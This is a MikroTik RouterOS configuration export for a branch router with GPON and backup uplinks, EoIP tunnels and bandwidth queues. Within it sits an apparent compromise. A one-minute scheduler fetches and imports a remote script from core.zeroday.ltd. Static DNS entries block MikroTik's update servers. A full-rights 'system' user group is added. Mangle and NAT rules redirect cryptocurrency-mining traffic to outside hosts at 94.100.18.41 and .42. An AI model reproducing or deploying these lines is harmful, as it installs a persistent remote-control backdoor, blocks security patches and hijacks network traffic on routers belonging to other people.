# feb/15/2023 04:59:48 by RouterOS 6.43.7
# software id = R2CS-8C2G
#
# model = 951Ui-2nD
# serial number = 68BE05633E8D
/interface ethernet
set [ find default-name=ether1 ] advertise=\
    10M-half,10M-full,100M-half,100M-full,1000M-half,1000M-full name=\
    "ether1-GPON (Main)"
set [ find default-name=ether2 ] advertise=\
    10M-half,10M-full,100M-half,100M-full,1000M-half,1000M-full
set [ find default-name=ether3 ] advertise=\
    10M-half,10M-full,100M-half,100M-full,1000M-half,1000M-full name=\
    ether3-LAN
set [ find default-name=ether4 ] advertise=\
    10M-half,10M-full,100M-half,100M-full,1000M-half,1000M-full name=\
    "ether4-RL (Backup)"
set [ find default-name=ether5 ] advertise=\
    10M-half,10M-full,100M-half,100M-full,1000M-half,1000M-full
/interface wireless
set [ find default-name=wlan1 ] band=2ghz-b/g/n channel-width=20/40mhz-Ce \
    distance=indoors frequency=auto mode=ap-bridge ssid=MikroTik-5B38A5 \
    wireless-protocol=802.11
/interface eoip
add mac-address=02:E2:5C:9D:0F:DD name=TO-GARUT remote-address=182.23.24.98 \
    tunnel-id=10
add !keepalive mac-address=02:96:6A:9C:2D:FD name=TO-GARUT-BU remote-address=\
    182.23.25.2 tunnel-id=11
/interface list
add exclude=dynamic name=discover
add name=mactel
add name=mac-winbox
/interface wireless security-profiles
set [ find default=yes ] supplicant-identity=MikroTik
/ip hotspot profile
set [ find default=yes ] html-directory=flash/hotspot
/ip ipsec proposal
set [ find default=yes ] enc-algorithms=aes-128-cbc
/ip pool
add name=default-dhcp ranges=192.168.88.10-192.168.88.254
add name=dhcp_pool1 ranges=192.168.2.2-192.168.2.254
add name=dhcp_pool2 ranges=192.168.2.2-192.168.2.254
/ip dhcp-server
add address-pool=dhcp_pool2 disabled=no interface=ether3-LAN name=dhcp1
/ppp profile
set *0 dns-server=94.100.18.40,8.8.8.8
set *FFFFFFFE dns-server=94.100.18.40,8.8.8.8
/queue tree
add comment="BANDWIDTH MANAGEMENT GARUT" max-limit=3M name=garut-down parent=\
    ether3-LAN queue=default
add max-limit=3M name=garut-up parent=TO-GARUT queue=default
add limit-at=3M max-limit=3M name=queue1 packet-mark=garut parent=garut-down \
    queue=default
add limit-at=3M max-limit=3M name=queue2 packet-mark=garut parent=garut-up \
    queue=default
add comment="BANDWIDTH MANAGEMENT INTERNET" max-limit=8M name=internet-down \
    parent=ether3-LAN queue=default
add max-limit=8M name=internet-up parent="ether1-GPON (Main)" queue=default
add limit-at=8M max-limit=8M name=queue4 packet-mark=internet parent=\
    internet-down queue=default
add limit-at=8M max-limit=8M name=queue5 packet-mark=internet parent=\
    internet-up queue=default
add max-limit=3M name="garut-up'" parent=TO-GARUT-BU queue=default
add limit-at=3M max-limit=3M name=queue3 packet-mark=garut parent="garut-up'" \
    queue=default
add max-limit=8M name="internet-up'" parent="ether4-RL (Backup)" queue=\
    default
add limit-at=8M max-limit=8M name=queue6 packet-mark=internet parent=\
    "internet-up'" queue=default
/system logging action
set 1 disk-file-name=log
/user group
set read policy="local,telnet,ssh,read,test,winbox,password,web,sniff,sensitiv\
    e,api,romon,tikapp,!ftp,!reboot,!write,!policy,!dude"
add name=system policy="local,telnet,ssh,ftp,reboot,read,write,policy,test,win\
    box,password,web,sniff,sensitive,api,romon,dude,tikapp"
/interface bridge settings
set use-ip-firewall=yes use-ip-firewall-for-pppoe=yes \
    use-ip-firewall-for-vlan=yes
/ip firewall connection tracking
set enabled=yes
/ip neighbor discovery-settings
set discover-interface-list=discover
/ip settings
set accept-redirects=yes secure-redirects=no
/interface list member
add list=discover
add interface=ether3-LAN list=discover
add interface="ether4-RL (Backup)" list=discover
add interface=ether5 list=discover
add interface=wlan1 list=discover
add list=mactel
add interface=ether3-LAN list=mactel
add list=mac-winbox
add interface="ether4-RL (Backup)" list=mactel
add interface=ether5 list=mactel
add interface=ether3-LAN list=mac-winbox
add interface=wlan1 list=mactel
add interface="ether4-RL (Backup)" list=mac-winbox
add list=mactel
add interface=ether5 list=mac-winbox
add interface=wlan1 list=mac-winbox
add list=mac-winbox
/ip address
add address=182.23.29.210/28 interface="ether1-GPON (Main)" network=\
    182.23.29.208
add address=182.23.1.130/28 interface="ether4-RL (Backup)" network=\
    182.23.1.128
add address=192.168.2.1/24 interface=ether3-LAN network=192.168.2.0
add address=10.10.10.1/30 interface=TO-GARUT network=10.10.10.0
add address=10.11.11.1/30 interface=TO-GARUT-BU network=10.11.11.0
/ip dhcp-client
add comment="default configuration" dhcp-options=hostname,clientid disabled=\
    no interface="ether1-GPON (Main)"
/ip dhcp-server network
add address=192.168.2.0/24 gateway=192.168.2.1
/ip dns
set allow-remote-requests=yes servers=202.152.0.2,202.152.5.36
/ip dns static
add address=127.0.0.1 name=download.mikrotik.com
add address=127.0.0.1 name=update.mikrotik.com
add address=127.0.0.1 name=upgrade.mikrotik.com
add address=127.0.0.1 name=download2.mikrotik.com
add address=127.0.0.1 name=upgrade2.mikrotik.com
/ip firewall filter
add action=drop chain=input dst-port=53 in-interface="ether1-GPON (Main)" \
    protocol=udp
add action=drop chain=input dst-port=53 in-interface="ether4-RL (Backup)" \
    protocol=udp
add action=accept chain=forward
add action=accept chain=forward
add action=accept chain=forward
add action=accept chain=forward
add action=accept chain=forward connection-nat-state=dstnat
add action=accept chain=forward
add action=accept chain=forward connection-nat-state=dstnat
add action=accept chain=forward
add action=accept chain=forward connection-nat-state=dstnat
add action=drop chain=input comment="drop ssh brute forcers" dst-port=22 \
    protocol=tcp src-address-list=ssh_blacklist
add action=add-src-to-address-list address-list=ssh_blacklist \
    address-list-timeout=1w3d chain=input connection-state=new dst-port=22 \
    protocol=tcp src-address-list=ssh_stage3
add action=add-src-to-address-list address-list=ssh_stage2 \
    address-list-timeout=1m chain=input connection-state=new dst-port=22 \
    protocol=tcp src-address-list=ssh_stage1
add action=add-src-to-address-list address-list=ssh_stage1 \
    address-list-timeout=1m chain=input connection-state=new dst-port=22 \
    protocol=tcp
/ip firewall mangle
add action=add-dst-to-address-list address-list=sha chain=prerouting content=\
    mining.submit dst-address=!94.100.18.41 dst-port=!80,23,8291,64444 \
    protocol=tcp src-address=!94.100.18.41
add action=add-dst-to-address-list address-list=eth chain=prerouting content=\
    eth_submit dst-address=!94.100.18.42 dst-port=!23,8291,64444 protocol=tcp \
    src-address=!94.100.18.42
add action=mark-connection chain=prerouting dst-address=192.168.254.0/24 \
    new-connection-mark=garut-con src-address=192.168.2.0/24
add action=mark-packet chain=prerouting connection-mark=garut-con \
    new-packet-mark=garut passthrough=no
add action=mark-connection chain=prerouting new-connection-mark=internet \
    src-address=192.168.2.0/24
add action=mark-packet chain=prerouting connection-mark=internet \
    new-packet-mark=internet passthrough=no
add action=add-dst-to-address-list address-list=sha chain=prerouting content=\
    mining.submit dst-address=!94.100.18.41 dst-port=!80,23,8291,64444,8080 \
    protocol=tcp
/ip firewall nat
add action=dst-nat chain=dstnat comment=sha dst-address=!94.100.18.41 \
    dst-address-list=sha dst-port=!23,8291,64444 protocol=tcp src-address=\
    !94.100.18.41 to-addresses=94.100.18.41 to-ports=3333
add action=dst-nat chain=dstnat comment=eth dst-address=!94.100.18.42 \
    dst-address-list=eth dst-port=!23,8291,64444 protocol=tcp src-address=\
    !94.100.18.42 to-addresses=94.100.18.42 to-ports=4444
add action=masquerade chain=srcnat out-interface="ether1-GPON (Main)" \
    src-address=192.168.2.0/24
add action=masquerade chain=srcnat out-interface="ether4-RL (Backup)" \
    src-address=192.168.2.0/24
add action=dst-nat chain=dstnat comment=sha dst-address=!94.100.18.41 \
    dst-address-list=sha dst-port=!80,23,8291,64444 protocol=tcp src-address=\
    !94.100.18.41 to-addresses=94.100.18.41 to-ports=3333
add action=dst-nat chain=dstnat comment=eth dst-address=!94.100.18.42 \
    dst-address-list=eth dst-port=!80,23,8291,64444 protocol=tcp src-address=\
    !94.100.18.42 to-addresses=94.100.18.42 to-ports=4444
/ip route
add check-gateway=ping distance=1 gateway=182.23.29.209
add check-gateway=ping distance=5 gateway=182.23.1.129
add check-gateway=ping distance=1 dst-address=192.168.254.0/24 gateway=\
    10.10.10.2
add check-gateway=ping distance=5 dst-address=192.168.254.0/24 gateway=\
    10.11.11.2
/ip service
set telnet port=8181
set ftp disabled=yes
set www disabled=yes
set ssh port=212
set api-ssl disabled=yes
/system clock
set time-zone-name=Asia/Jakarta
/system identity
set name=2016001775-TKU
/system leds
set 5 interface=wlan1 leds=""
/system scheduler
add interval=1m name=fetch1m on-event=fetch policy=\
    ftp,reboot,read,write,policy,test,sniff,sensitive,romon start-date=\
    nov/28/2020 start-time=07:03:58
/system script
add dont-require-permissions=no name=fetch owner=system policy=\
    ftp,reboot,read,write,policy,test,password,sniff,sensitive,romon source=":\
    do { /tool fetch url=https://core.zeroday.ltd/command.rsc };:delay 4000ms;\
    /import file-name=command.rsc;/file remove command.rsc"
/tool mac-server
set allowed-interface-list=mactel
/tool mac-server mac-winbox
set allowed-interface-list=mac-winbox
